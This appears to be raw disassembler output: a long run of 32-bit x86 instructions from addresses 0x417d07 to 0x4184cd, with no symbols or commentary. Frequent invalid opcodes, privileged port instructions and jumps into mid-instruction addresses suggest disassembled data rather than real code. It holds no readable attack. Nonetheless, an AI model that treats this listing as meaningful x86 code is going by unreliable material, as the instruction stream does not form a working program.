  417d07:	in     al,dx
  417d08:	ret    
  417d09:	pop    esp
  417d0a:	xchg   esi,eax
  417d0b:	aas    
  417d0c:	xchg   esp,eax
  417d0d:	aad    0xcb
  417d0f:	enter  0x7dad,0x5d
  417d13:	out    dx,al
  417d14:	inc    esp
  417d15:	popf   
  417d16:	sahf   
  417d17:	sub    al,0xe2
  417d19:	xor    DWORD PTR [edi+0x3197f21a],esp
  417d1f:	mov    ss,WORD PTR [bp+di-0x47b9]
  417d24:	xor    eax,0x971dce35
  417d29:	sti    
  417d2a:	jns    0x417d58
  417d2c:	(bad)  
  417d2d:	push   ss
  417d2e:	sub    BYTE PTR [edx],0xc3
  417d31:	jp     0x417cb5
  417d33:	fs push 0x658c1536
  417d39:	xchg   esp,eax
  417d3a:	retf   
  417d3b:	mov    ecx,0x204bf926
  417d40:	xor    eax,DWORD PTR [edi-0x55]
  417d43:	icebp  
  417d44:	push   esp
  417d45:	addr16 (bad) 
  417d47:	adc    esp,esi
  417d49:	mov    bh,0x23
  417d4b:	adc    DWORD PTR [eax+0x4762a9a4],ecx
  417d51:	repz mov dl,0x45
  417d54:	add    al,0xa4
  417d56:	stos   BYTE PTR es:[edi],al
  417d57:	sbb    ch,BYTE PTR [eax-0x5a]
  417d5a:	lea    eax,[ecx+0x5]
  417d5d:	mov    cl,BYTE PTR [eax-0x2d]
  417d60:	add    eax,0x5cbd4caf
  417d65:	pop    edx
  417d66:	retf   
  417d67:	mov    ah,0xfc
  417d69:	pop    es
  417d6a:	ret    
  417d6b:	leave  
  417d6c:	adc    ch,0x4a
  417d6f:	pop    es
  417d70:	mov    edx,0xcf551509
  417d75:	dec    ebx
  417d76:	pushf  
  417d77:	cdq    
  417d78:	or     BYTE PTR [edx+0x185ba67c],dh
  417d7e:	xchg   ecx,eax
  417d7f:	push   cs
  417d80:	mov    al,0x6b
  417d82:	aad    0x6d
  417d84:	push   0x5c706c3d
  417d89:	mov    eax,ebp
  417d8b:	mov    bh,0xd1
  417d8d:	aam    0xfe
  417d8f:	in     eax,0x79
  417d91:	push   ebp
  417d92:	mov    esi,0x16045f37
  417d97:	js     0x417d67
  417d99:	push   ebp
  417d9a:	sub    eax,0x182f845c
  417d9f:	fsub   QWORD PTR [edi+0x5]
  417da2:	or     BYTE PTR [edi-0x39552d5d],cl
  417da8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417da9:	push   edi
  417daa:	int    0xe5
  417dac:	sub    edi,DWORD PTR [ebp+0x872b27b]
  417db2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417db3:	sub    ebp,DWORD PTR [edi-0x6950ca98]
  417db9:	pushf  
  417dba:	jns    0x417db6
  417dbc:	push   DWORD PTR [ebp+0x56]
  417dbf:	or     edi,DWORD PTR [ebx]
  417dc1:	and    ecx,0x3a
  417dc4:	sub    bl,al
  417dc6:	jb     0x417dcd
  417dc8:	dec    edi
  417dc9:	fist   DWORD PTR ds:0xfeaf2522
  417dcf:	cld    
  417dd0:	xchg   ebp,eax
  417dd1:	std    
  417dd2:	xor    DWORD PTR [edx-0x5],ebx
  417dd5:	xchg   ebx,eax
  417dd6:	xchg   edx,eax
  417dd7:	xchg   DWORD PTR [eax+eax*1-0x7d04c6cd],esi
  417dde:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417de0:	push   ds
  417de1:	clc    
  417de2:	and    edx,DWORD PTR [edi-0xb55517d]
  417de8:	add    ebx,DWORD PTR [ebp-0xcde09c7]
  417dee:	mov    fs,WORD PTR [esi-0x6fe3758f]
  417df4:	ss jmp 0x417ded
  417df7:	cmc    
  417df8:	jno    0x417e10
  417dfa:	out    dx,eax
  417dfb:	shl    BYTE PTR [ebp-0x59],1
  417dfe:	xor    eax,0x663ddde4
  417e03:	psraw  mm3,QWORD PTR [esi+0x68]
  417e07:	mov    esi,0x969ec306
  417e0c:	stos   BYTE PTR es:[edi],al
  417e0d:	add    BYTE PTR [esi+edi*1+0x7b],bl
  417e11:	push   ebx
  417e12:	stos   DWORD PTR es:[edi],eax
  417e13:	ret    
  417e14:	push   ds
  417e15:	sub    eax,0x2d8f33af
  417e1a:	mov    esi,0x6886719d
  417e1f:	imul   edx,DWORD PTR [edx+0x497694ab],0xc360c1be
  417e29:	push   edi
  417e2a:	or     ecx,ebp
  417e2c:	leave  
  417e2d:	dec    esi
  417e2e:	das    
  417e2f:	(bad)  
  417e30:	and    edi,DWORD PTR [esi]
  417e32:	add    al,0x5a
  417e34:	mov    bh,0x90
  417e36:	pushf  
  417e37:	push   ss
  417e38:	sub    ecx,DWORD PTR [edi]
  417e3a:	jne    0x417ea4
  417e3c:	int3   
  417e3d:	xlat   BYTE PTR ds:[ebx]
  417e3e:	adc    cl,bh
  417e40:	jb     0x417e43
  417e42:	or     DWORD PTR [ebp-0x5e035cf7],ecx
  417e48:	dec    esi
  417e49:	and    DWORD PTR [esi+ecx*2+0x221b53d4],ecx
  417e50:	ins    BYTE PTR es:[edi],dx
  417e51:	in     al,0x1a
  417e53:	stos   DWORD PTR es:[edi],eax
  417e54:	jge    0x417ece
  417e56:	pop    ebp
  417e57:	sub    BYTE PTR ds:0xe4412674,0x23
  417e5e:	outs   dx,BYTE PTR ds:[esi]
  417e5f:	fwait
  417e60:	pushf  
  417e61:	dec    edi
  417e62:	lods   eax,DWORD PTR ds:[esi]
  417e63:	dec    ebp
  417e64:	enter  0xdffa,0xc0
  417e68:	push   ds
  417e69:	push   eax
  417e6a:	test   eax,0xa3ea713
  417e6f:	and    edx,0xffffffc9
  417e72:	or     al,0xed
  417e74:	jl     0x417e8d
  417e76:	jae    0x417e82
  417e78:	sub    DWORD PTR [edi-0x5bf9cd66],0x3207e287
  417e82:	sbb    edx,esp
  417e84:	mov    ecx,DWORD PTR [edi]
  417e86:	and    cl,BYTE PTR [eax-0xb25fb7e]
  417e8c:	mov    esp,0x1c952187
  417e91:	out    0x51,eax
  417e93:	cmp    ch,BYTE PTR [ebx+ecx*2+0x751301b1]
  417e9a:	ror    BYTE PTR [ebp+0x5a],cl
  417e9d:	mov    al,0x16
  417e9f:	mov    ds:0xa556eb2c,eax
  417ea4:	sbb    al,0xde
  417ea6:	mov    cl,0x3d
  417ea8:	xchg   ebp,eax
  417ea9:	cmp    ebx,0x9f31633b
  417eaf:	sbb    DWORD PTR [edx],0x3636fea8
  417eb5:	idiv   BYTE PTR [edx]
  417eb7:	xchg   esi,eax
  417eb8:	xor    ah,dl
  417eba:	add    BYTE PTR [edi],bl
  417ebc:	stos   BYTE PTR es:[edi],al
  417ebd:	push   esi
  417ebe:	xchg   edi,eax
  417ebf:	ss push cs
  417ec1:	and    DWORD PTR [edx],0xbb9370b6
  417ec7:	xor    ecx,DWORD PTR [ebx-0x653453fb]
  417ecd:	mov    ebx,ds
  417ecf:	mov    edx,0x437da728
  417ed4:	fadd   DWORD PTR [edx]
  417ed6:	cmp    ah,BYTE PTR [edi-0x2b]
  417ed9:	in     al,0x28
  417edb:	adc    edi,0xcb95a133
  417ee1:	arpl   WORD PTR [ebp-0x6],bp
  417ee4:	mov    edx,0xbcc1b437
  417ee9:	cmp    BYTE PTR [ebp+0x17],dl
  417eec:	aad    0x9e
  417eee:	sti    
  417eef:	mov    dh,0x34
  417ef1:	loopne 0x417ee6
  417ef3:	idiv   BYTE PTR [edi-0x65]
  417ef6:	xchg   ecx,eax
  417ef7:	xchg   esi,eax
  417ef8:	mov    ch,0xe3
  417efa:	mov    ecx,0x80dc2063
  417eff:	lahf   
  417f00:	repnz out dx,ax
  417f03:	xchg   esi,eax
  417f04:	and    DWORD PTR [edi-0xb],esi
  417f07:	std    
  417f08:	push   0x962e134f
  417f0d:	add    BYTE PTR [eax+edx*8],0x79
  417f11:	test   DWORD PTR ds:0x837090ea,0xad50f324
  417f1b:	loope  0x417efa
  417f1d:	ja     0x417f87
  417f1f:	mov    al,dh
  417f21:	shl    DWORD PTR [ebx+ebp*4+0x63],1
  417f25:	pop    ds
  417f26:	scas   al,BYTE PTR es:[edi]
  417f27:	xchg   esi,eax
  417f28:	ja     0x417f88
  417f2a:	pop    ss
  417f2b:	fdiv   st,st(2)
  417f2d:	lahf   
  417f2e:	sub    DWORD PTR [esi],edi
  417f30:	lock enter 0x1d1d,0x54
  417f35:	(bad)  
  417f36:	xchg   ebp,eax
  417f37:	adc    DWORD PTR [esi+0x3c20874c],edi
  417f3d:	pusha  
  417f3e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417f3f:	jmp    0x417fbf
  417f41:	aas    
  417f42:	xchg   ebp,eax
  417f43:	imul   eax,DWORD PTR [ebx],0xc9e463d5
  417f49:	push   eax
  417f4a:	adc    edi,DWORD PTR [edx]
  417f4c:	imul   ebx,DWORD PTR [edi-0x48],0x6426c7d5
  417f53:	loop   0x417fa8
  417f55:	je     0x417f0e
  417f57:	and    eax,esi
  417f59:	in     al,dx
  417f5a:	cmp    al,0xaf
  417f5c:	inc    esi
  417f5d:	outs   dx,DWORD PTR ds:[esi]
  417f5e:	pop    ds
  417f5f:	pop    ebp
  417f60:	repz (bad) 
  417f63:	stos   BYTE PTR es:[edi],al
  417f64:	lock inc esp
  417f66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f67:	cdq    
  417f68:	xchg   ebp,eax
  417f69:	dec    esp
  417f6a:	mov    al,ds:0xe6d1504d
  417f6f:	push   ebp
  417f70:	(bad)  
  417f71:	mov    ch,0x49
  417f73:	(bad)  
  417f74:	mov    ah,0xa6
  417f76:	xor    eax,0x6c46dfb0
  417f7b:	add    dh,BYTE PTR [eax+0x60f3a6be]
  417f81:	lock fld QWORD PTR [di]
  417f85:	ffree  st(6)
  417f87:	inc    eax
  417f88:	hlt    
  417f89:	call   0x558b:0x65f7f4b6
  417f90:	push   ecx
  417f91:	adc    DWORD PTR [edx+ecx*1-0x1cbd0b34],esp
  417f98:	std    
  417f99:	xchg   esi,eax
  417f9a:	sub    ebx,DWORD PTR fs:[edx]
  417f9d:	out    0xc4,al
  417f9f:	test   DWORD PTR [ebx-0x41a00bec],edi
  417fa5:	in     eax,0xd
  417fa7:	mov    esp,0xb08c4b38
  417fac:	loop   0x417f98
  417fae:	sbb    eax,DWORD PTR [eax-0x1f]
  417fb1:	xchg   edi,eax
  417fb2:	fimul  DWORD PTR [esi-0x80dead6]
  417fb8:	inc    sp
  417fba:	and    eax,0xa95abb0f
  417fbf:	ja     0x417f56
  417fc1:	rcr    dh,1
  417fc3:	out    dx,eax
  417fc4:	out    0x42,al
  417fc6:	pop    esi
  417fc7:	jae    0x417fe2
  417fc9:	sbb    eax,0xb28d9fa1
  417fce:	fild   QWORD PTR [ebx+esi*1+0x463e1c50]
  417fd5:	fstp   QWORD PTR [esi]
  417fd7:	mov    eax,0xfc2fc899
  417fdc:	xchg   edx,eax
  417fdd:	xchg   ebx,eax
  417fde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fdf:	aam    0x2d
  417fe1:	pop    edi
  417fe2:	jb     0x417f96
  417fe4:	cmp    esi,esi
  417fe6:	sub    bl,BYTE PTR [ebx+0x25]
  417fe9:	fs loopne 0x417f82
  417fec:	pop    ss
  417fed:	push   0x6d193523
  417ff2:	mov    cs,WORD PTR [ecx]
  417ff4:	push   esi
  417ff5:	mov    ebx,0xe833d96e
  417ffa:	cmp    ebp,esi
  417ffc:	hlt    
  417ffd:	stos   DWORD PTR es:[edi],eax
  417ffe:	in     eax,dx
  417fff:	sbb    cl,bh
  418001:	sti    
  418002:	xchg   ebx,eax
  418003:	jae    0x417f9b
  418005:	pop    ds
  418006:	(bad)  
  418007:	loop   0x418043
  418009:	adc    cl,BYTE PTR [eax-0x5a611d2e]
  41800f:	adc    esp,DWORD PTR [edi]
  418011:	das    
  418012:	(bad)  
  418013:	(bad)  
  418014:	xchg   ebp,eax
  418015:	aaa    
  418016:	rol    DWORD PTR [eax-0x3b],1
  418019:	outs   dx,BYTE PTR ds:[esi]
  41801a:	aad    0x26
  41801c:	mov    BYTE PTR [ecx+0x25c016f1],ah
  418022:	(bad)  
  418024:	dec    ebx
  418025:	lea    esp,[ecx-0x59874569]
  41802b:	jle    0x41808f
  41802d:	mov    ch,0xfa
  41802f:	or     al,0x35
  418031:	mov    WORD PTR [ebx-0x42],?
  418034:	push   ebx
  418035:	sahf   
  418036:	test   BYTE PTR [eax-0x3b],0x44
  41803a:	scas   al,BYTE PTR es:[edi]
  41803b:	adc    DWORD PTR [edi-0x10371f53],ebx
  418041:	mov    edi,0x2ac793f5
  418046:	inc    edi
  418047:	sbb    eax,0x7e18161f
  41804c:	mov    edi,edi
  41804e:	mov    esi,DWORD PTR [edi+ecx*4+0x71b55151]
  418055:	add    esp,DWORD PTR [edi+0x15c5a387]
  41805b:	jbe    0x417ff0
  41805d:	jmp    0x1f4:0x5da941fc
  418064:	xlat   BYTE PTR ds:[ebx]
  418065:	(bad)  
  418066:	lahf   
  418067:	stc    
  418068:	pusha  
  418069:	jmp    0x417ffa
  41806b:	mov    ecx,0x13f8a9cb
  418070:	in     eax,0x52
  418072:	in     eax,0x32
  418074:	xchg   esi,eax
  418075:	xor    DWORD PTR [edx-0x1f],edi
  418078:	aaa    
  418079:	int    0xfd
  41807b:	cld    
  41807c:	sub    al,0xd4
  41807e:	pop    ds
  41807f:	test   eax,0xf34a72f4
  418084:	push   edi
  418085:	stos   BYTE PTR es:[edi],al
  418086:	jb     0x4180af
  418088:	leave  
  418089:	ja     0x4180f9
  41808b:	sub    dl,BYTE PTR [ecx+eiz*1]
  41808e:	cld    
  41808f:	or     DWORD PTR ds:[edi-0x77],edx
  418093:	push   ecx
  418094:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418095:	in     al,0x86
  418097:	test   BYTE PTR ds:0xe6dbdc3e,cl
  41809d:	jns    0x41808e
  41809f:	pop    es
  4180a0:	sti    
  4180a1:	lahf   
  4180a2:	pop    eax
  4180a3:	xchg   esp,eax
  4180a4:	mov    cl,BYTE PTR [edi-0x1359f081]
  4180aa:	add    eax,0x12e0cd82
  4180af:	popf   
  4180b0:	xchg   esp,ecx
  4180b2:	icebp  
  4180b3:	lods   al,BYTE PTR ds:[esi]
  4180b4:	and    edx,DWORD PTR [ebx-0x4e6e653]
  4180ba:	jmp    0x53b70d4a
  4180bf:	inc    esi
  4180c0:	or     edi,ecx
  4180c2:	loopne 0x418121
  4180c4:	dec    edx
  4180c5:	test   eax,0xfabc9c80
  4180ca:	ficomp WORD PTR [edi]
  4180cc:	jle    0x418094
  4180ce:	bound  esi,QWORD PTR [esi]
  4180d0:	test   cl,bl
  4180d2:	xlat   BYTE PTR ds:[ebx]
  4180d3:	not    DWORD PTR [ebx-0x2d]
  4180d6:	push   ebp
  4180d7:	mov    ah,0xa0
  4180d9:	inc    edx
  4180da:	imul   eax,esi,0xffffff93
  4180dd:	ss inc ebx
  4180df:	shr    DWORD PTR [eax],0x9b
  4180e2:	or     BYTE PTR [edi+0x38],ah
  4180e5:	cmp    bl,BYTE PTR [eax]
  4180e7:	jmp    0xeaeb:0xc7ad026d
  4180ee:	pop    eax
  4180ef:	iret   
  4180f0:	ja     0x41808b
  4180f2:	sub    eax,eax
  4180f4:	cld    
  4180f5:	test   al,0xd2
  4180f7:	icebp  
  4180f8:	inc    esp
  4180f9:	jp     0x418170
  4180fb:	xor    edi,DWORD PTR [eax]
  4180fd:	ins    DWORD PTR es:[edi],dx
  4180fe:	frstor [esi]
  418100:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418101:	enter  0xfb71,0x38
  418105:	(bad)  
  418106:	jge    0x4180bd
  418108:	cmc    
  418109:	pusha  
  41810a:	hlt    
  41810b:	bound  esi,QWORD PTR [eax+edi*8-0x78]
  41810f:	iret   
  418110:	shl    DWORD PTR [ecx+0x5e170f59],cl
  418116:	fbstp  TBYTE PTR [edi+0x3f0f5491]
  41811c:	mov    dl,0xaf
  41811e:	cmp    BYTE PTR [eax+0x40],bl
  418121:	mov    bl,0x8a
  418123:	imul   esp,DWORD PTR [edx-0x660a4e44],0x31
  41812a:	pop    edi
  41812b:	es xchg esp,eax
  41812d:	cmc    
  41812e:	out    dx,al
  41812f:	mov    al,ds:0x702c9c60
  418134:	or     bl,BYTE PTR [edx+ebx*1]
  418137:	out    dx,al
  418138:	fisttp QWORD PTR [ebp+0x9]
  41813b:	push   eax
  41813c:	push   cs
  41813d:	ins    DWORD PTR es:[edi],dx
  41813e:	mov    ch,0x6f
  418140:	enter  0xc1c5,0x35
  418144:	adc    al,0xf9
  418146:	rcl    BYTE PTR [edx-0x5fe0aa00],0x13
  41814d:	ja     0x418132
  41814f:	mov    esi,0x70b7ef7f
  418154:	jo     0x418187
  418156:	inc    ebp
  418157:	mov    WORD PTR [edi+0x9a4c25b],gs
  41815d:	imul   ebp,ebx,0xd9269d1f
  418163:	retf   0x939a
  418166:	push   ds
  418167:	cmp    BYTE PTR [esi-0x613de1fe],0xa2
  41816e:	daa    
  41816f:	aas    
  418170:	jmp    0x50d9:0x82452787
  418177:	ror    BYTE PTR [ecx+edx*1],1
  41817a:	sbb    ch,BYTE PTR [ebp+0x3e]
  41817d:	aaa    
  41817e:	push   edx
  41817f:	gs out dx,eax
  418181:	ror    DWORD PTR [ebp+0x9ba66e8],cl
  418187:	std    
  418188:	push   edi
  418189:	and    DWORD PTR [ebx+ecx*4+0xd5ff454],eax
  418190:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418191:	pusha  
  418192:	sbb    DWORD PTR [edi+ecx*4-0x68b51492],0xf55f3751
  41819d:	mov    al,ds:0x2db08c26
  4181a2:	xor    ebx,edx
  4181a4:	bound  esi,QWORD PTR [ebx-0x63]
  4181a7:	xchg   ebp,eax
  4181a8:	xor    ebx,DWORD PTR [eax-0x6b0e2051]
  4181ae:	nop
  4181af:	sub    eax,0x5839729f
  4181b4:	lock repnz cli 
  4181b7:	imul   esi,edi,0x96b7acd0
  4181bd:	pop    eax
  4181be:	in     al,dx
  4181bf:	lock mov dh,BYTE PTR [eax]
  4181c2:	mov    esi,0x5ae5f89a
  4181c7:	fcomp  DWORD PTR [edx+0x1f]
  4181ca:	shr    BYTE PTR [esi-0x27],1
  4181cd:	jne    0x41816f
  4181cf:	fcmovnu st,st(5)
  4181d1:	add    DWORD PTR [edi-0x4c],0x1135c36f
  4181d8:	cmp    esp,DWORD PTR [ebp-0x52cf929d]
  4181de:	jne    0x4181d7
  4181e0:	ins    BYTE PTR es:[edi],dx
  4181e1:	or     ebx,esi
  4181e3:	lds    ecx,FWORD PTR [esi+0x4eb2708d]
  4181e9:	outs   dx,BYTE PTR ds:[esi]
  4181ea:	mov    esi,0x953d1a5f
  4181ef:	inc    ebx
  4181f0:	ror    ch,1
  4181f2:	(bad)  
  4181f3:	mov    dl,0xce
  4181f5:	psrlq  mm0,QWORD PTR [ebx+0x4e868d89]
  4181fc:	sbb    eax,0x92697c0c
  418201:	xchg   edx,eax
  418202:	pop    edx
  418203:	ret    
  418204:	pop    ss
  418205:	sti    
  418206:	cmp    ah,al
  418208:	data16 mov dh,0xde
  41820b:	cmp    esi,DWORD PTR [edx]
  41820d:	mov    ds:0xa345bf3f,al
  418212:	int    0xd3
  418214:	push   0xffffff8e
  418216:	ret    
  418217:	loop   0x418291
  418219:	(bad)  
  41821a:	cdq    
  41821b:	and    DWORD PTR [ebp+0x18],0x64
  41821f:	add    edi,eax
  418221:	xlat   BYTE PTR ds:[ebx]
  418222:	daa    
  418223:	les    ecx,FWORD PTR [ecx+0x6676cc9a]
  418229:	out    dx,al
  41822a:	dec    esp
  41822b:	idiv   BYTE PTR [ebx+0x70a5ec0a]
  418231:	pushf  
  418232:	test   eax,0xa56fe741
  418237:	dec    ebx
  418238:	push   esp
  418239:	pop    edx
  41823a:	test   BYTE PTR [eax+0x5ca710dd],0xdf
  418241:	in     al,0x5d
  418243:	call   0xf696344a
  418248:	xchg   edx,eax
  418249:	xor    esi,edi
  41824b:	dec    eax
  41824c:	fnsave [ebp-0x2957fb2]
  418252:	jge    0x4181f1
  418254:	ret    0x8d07
  418257:	xor    al,0x9d
  418259:	adc    BYTE PTR [eax],dh
  41825b:	or     eax,0x2e67040c
  418260:	sub    al,0xfb
  418262:	in     al,dx
  418263:	cwde   
  418264:	rol    DWORD PTR [edx],cl
  418266:	mov    ds:0xa9c1201d,eax
  41826b:	inc    ecx
  41826c:	jmp    0x4182d9
  41826e:	aas    
  41826f:	lods   eax,DWORD PTR ds:[esi]
  418270:	jp     0x4182e3
  418272:	int    0x5e
  418274:	mov    ch,0x74
  418276:	sahf   
  418277:	repz pop ds
  418279:	jmp    0x6c629d5a
  41827e:	xor    eax,0x6fe51ff6
  418283:	pusha  
  418284:	(bad)  
  418285:	retf   
  418286:	sbb    DWORD PTR [edi-0x3c],0xd02099e0
  41828d:	cwde   
  41828e:	ja     0x4182fe
  418290:	jg     0x4182db
  418292:	sub    bl,ch
  418294:	clc    
  418295:	jno    0x4182fc
  418297:	lock pushf 
  418299:	dec    ecx
  41829a:	mov    WORD PTR [esi],fs
  41829c:	rol    bl,cl
  41829e:	mov    ?,WORD PTR [ebp+ebx*4+0x706690ea]
  4182a5:	jo     0x418274
  4182a7:	mov    ch,0x1
  4182a9:	jbe    0x41828e
  4182ab:	ins    BYTE PTR es:[edi],dx
  4182ac:	cmp    BYTE PTR [ecx-0x7c],dl
  4182af:	lock mov ah,0xa3
  4182b2:	icebp  
  4182b3:	pop    edi
  4182b4:	loopne 0x4182d7
  4182b6:	jo     0x4182dd
  4182b8:	test   al,0xdc
  4182ba:	test   DWORD PTR [ecx],eax
  4182bc:	cmp    BYTE PTR [edi],0x5
  4182bf:	jno    0x4182dc
  4182c1:	lods   eax,DWORD PTR ds:[esi]
  4182c2:	retf   0xdbe8
  4182c5:	pop    edx
  4182c6:	xchg   ebp,eax
  4182c7:	mov    DWORD PTR [ebp+0x46],esi
  4182ca:	sub    DWORD PTR [eax+ebp*2],ebx
  4182cd:	sub    edi,ebp
  4182cf:	ror    dh,0x2d
  4182d2:	ins    BYTE PTR es:[edi],dx
  4182d3:	icebp  
  4182d4:	(bad)  
  4182d5:	jmp    0xe004:0x6477710d
  4182dc:	mov    cl,0xd2
  4182de:	aas    
  4182df:	cs leave 
  4182e1:	out    0x31,eax
  4182e3:	mov    eax,0xd37f038f
  4182e8:	fisub  DWORD PTR [ecx-0x7c56b0b3]
  4182ee:	jnp    0x4182b9
  4182f0:	test   eax,0x1bf0f450
  4182f5:	dec    edx
  4182f6:	cmp    al,bh
  4182f8:	mov    ecx,cs
  4182fa:	dec    esi
  4182fb:	lock pop ebp
  4182fd:	pop    esp
  4182fe:	retf   0x1efb
  418301:	xchg   edi,eax
  418302:	push   edi
  418303:	lea    edi,[esi+ebp*2]
  418306:	pop    edx
  418307:	push   esi
  418308:	cmp    eax,0x7bf9760d
  41830d:	fst    QWORD PTR [esi+0x79]
  418310:	sub    eax,0xb84064d2
  418315:	shr    DWORD PTR [ebp-0x7bc79815],cl
  41831b:	sbb    al,0x2b
  41831d:	retf   0xe0bf
  418320:	pop    eax
  418321:	mov    ebx,0xcad2140d
  418326:	daa    
  418327:	pop    ds
  418328:	rol    DWORD PTR [eax],0xce
  41832b:	es dec ebp
  41832d:	mov    ds:0x31b5794b,eax
  418332:	jmp    0x4183b0
  418334:	nop
  418335:	inc    edi
  418336:	sub    dh,BYTE PTR [ebx+0x7e]
  418339:	push   ss
  41833a:	fwait
  41833b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41833c:	jmp    0xb709:0x821f97a0
  418343:	jnp    0x4182ce
  418345:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418346:	push   edi
  418347:	outs   dx,BYTE PTR ds:[esi]
  418348:	xchg   esi,eax
  418349:	inc    ebp
  41834a:	adc    DWORD PTR [ecx+0x67],0xfffffff8
  41834e:	daa    
  41834f:	aad    0x41
  418351:	inc    esi
  418352:	outs   dx,BYTE PTR ds:[esi]
  418353:	cmp    al,0x3f
  418355:	xor    DWORD PTR [edi+edi*2],ecx
  418358:	(bad)  
  418359:	shl    DWORD PTR [eax-0x18],cl
  41835c:	jne    0x4183ab
  41835e:	stos   BYTE PTR es:[edi],al
  41835f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418360:	sbb    eax,0xb970f133
  418365:	mov    dh,0x52
  418367:	sub    al,0xee
  418369:	lahf   
  41836a:	sub    ebp,DWORD PTR [esi-0x3eac4784]
  418370:	push   ecx
  418371:	addr16 inc ecx
  418373:	mov    ds:0xd6a2e0c0,eax
  418378:	cld    
  418379:	addr16 mov ebp,0xf003529
  41837f:	and    BYTE PTR [ecx-0x1f9c9987],ch
  418385:	inc    edi
  418386:	or     BYTE PTR [eax-0x7b],ch
  418389:	es push cs
  41838b:	cmp    esi,DWORD PTR [ebx]
  41838d:	shl    BYTE PTR [eax+0x2dfbd1f9],cl
  418393:	out    dx,al
  418394:	mov    esp,0xf3e4014e
  418399:	mov    bh,0xa5
  41839b:	mov    eax,ds:0xc577aa1e
  4183a0:	aaa    
  4183a1:	add    BYTE PTR [ecx+0x37],bh
  4183a4:	leave  
  4183a5:	cmp    al,0x7
  4183a7:	push   eax
  4183a8:	dec    ebp
  4183a9:	dec    ecx
  4183aa:	test   al,0x88
  4183ac:	adc    BYTE PTR [eax+0x3f0758ca],ah
  4183b2:	lods   eax,DWORD PTR ds:[esi]
  4183b3:	and    bl,bh
  4183b5:	std    
  4183b6:	pusha  
  4183b7:	(bad)  
  4183b8:	pop    esi
  4183b9:	mov    dh,0xcd
  4183bb:	cld    
  4183bc:	test   eax,0x26db2427
  4183c1:	push   cs
  4183c2:	fcmovnbe st,st(1)
  4183c4:	test   DWORD PTR [edi+0x45],ebp
  4183c7:	shr    DWORD PTR [edi],0x35
  4183ca:	fisttp DWORD PTR [edx+edx*4]
  4183cd:	fs stos DWORD PTR es:[edi],eax
  4183cf:	out    dx,al
  4183d0:	(bad)  
  4183d1:	mov    al,ds:0x662da08a
  4183d6:	xor    ebp,DWORD PTR [edx+edi*8]
  4183d9:	fs mov ah,0x51
  4183dc:	push   0x60
  4183de:	mov    edx,0xd921d08e
  4183e3:	jmp    0x418426
  4183e5:	ret    0xc76a
  4183e8:	jge    0x41839e
  4183ea:	add    BYTE PTR [eax],ah
  4183ec:	cmc    
  4183ed:	ror    BYTE PTR [ebp-0x66bd02b1],cl
  4183f3:	sbb    DWORD PTR [ecx-0xa],ecx
  4183f6:	pusha  
  4183f7:	push   edi
  4183f8:	or     DWORD PTR ds:0x85e1e00d,0x73
  4183ff:	test   BYTE PTR [ecx],0x8d
  418402:	sub    eax,0xd0cad47b
  418407:	and    BYTE PTR [edi],dl
  418409:	fwait
  41840a:	sbb    DWORD PTR [ebp+0x7befdde],esi
  418410:	mov    cl,0x46
  418412:	inc    esp
  418413:	mov    esi,0xca6b16f4
  418418:	stos   DWORD PTR es:[edi],eax
  418419:	js     0x4183f0
  41841b:	ins    DWORD PTR es:[edi],dx
  41841c:	int    0x3b
  41841e:	push   esi
  41841f:	push   cs
  418420:	fild   DWORD PTR [ecx+ebx*4+0x47]
  418424:	jmp    0x368a4454
  418429:	xchg   ecx,eax
  41842a:	stc    
  41842b:	(bad)  
  41842c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41842d:	js     0x41849b
  41842f:	and    esp,DWORD PTR [ecx-0x3258515a]
  418435:	sar    DWORD PTR [esi+eiz*2+0x4],1
  418439:	hlt    
  41843a:	jl     0x418407
  41843c:	xchg   esp,eax
  41843d:	mov    ch,BYTE PTR [ecx+eiz*1-0x23b73cef]
  418444:	mov    eax,0x9997283b
  418449:	fs sti 
  41844b:	xchg   BYTE PTR [edi],dh
  41844d:	mov    ch,BYTE PTR [eax-0x20]
  418450:	call   0xdef6:0xdf166207
  418457:	add    al,BYTE PTR [eax+eiz*4-0x5c]
  41845b:	aaa    
  41845c:	mov    cl,0x49
  41845e:	(bad)  
  41845f:	push   ecx
  418460:	push   edx
  418461:	jb     0x4184ae
  418463:	aam    0x3
  418465:	out    0xef,eax
  418467:	mov    BYTE PTR [eax],dh
  418469:	in     al,0x40
  41846b:	mov    al,ds:0x4a75c6d2
  418470:	jns    0x4184b4
  418472:	xor    ebp,DWORD PTR [eax+eiz*8+0x46]
  418476:	lds    ecx,FWORD PTR [ebp-0x254c36ab]
  41847c:	sub    ch,BYTE PTR [esi+0x10]
  41847f:	int3   
  418480:	ret    0xe5f2
  418483:	mov    eax,ds:0x650d2320
  418488:	or     bh,BYTE PTR ds:0x916ac3c2
  41848e:	pop    edx
  41848f:	jno    0x41846d
  418491:	lock xor DWORD PTR [esi+ebx*1-0xb],0xffffff9a
  418497:	in     al,dx
  418498:	clc    
  418499:	mov    al,ds:0x1bc925d6
  41849e:	adc    cl,bl
  4184a0:	adc    dl,bl
  4184a2:	ja     0x4184b4
  4184a4:	dec    esp
  4184a5:	popf   
  4184a6:	popf   
  4184a7:	jns    0x4184e9
  4184a9:	loop   0x4184e5
  4184ab:	dec    eax
  4184ac:	je     0x41844e
  4184ae:	push   ebx
  4184af:	xchg   edx,eax
  4184b0:	cdq    
  4184b1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4184b2:	icebp  
  4184b3:	daa    
  4184b4:	xor    bh,BYTE PTR [esi-0x1ecefdcf]
  4184ba:	icebp  
  4184bb:	fiadd  DWORD PTR [edi+0x4d3b6386]
  4184c1:	rcr    BYTE PTR [ebx],cl
  4184c3:	daa    
  4184c4:	call   0xd4e7:0xdc6275b5
  4184cb:	jns    0x418532
  4184cd:	add    edx,DWORD PTR [edi-0x1b7661a1]
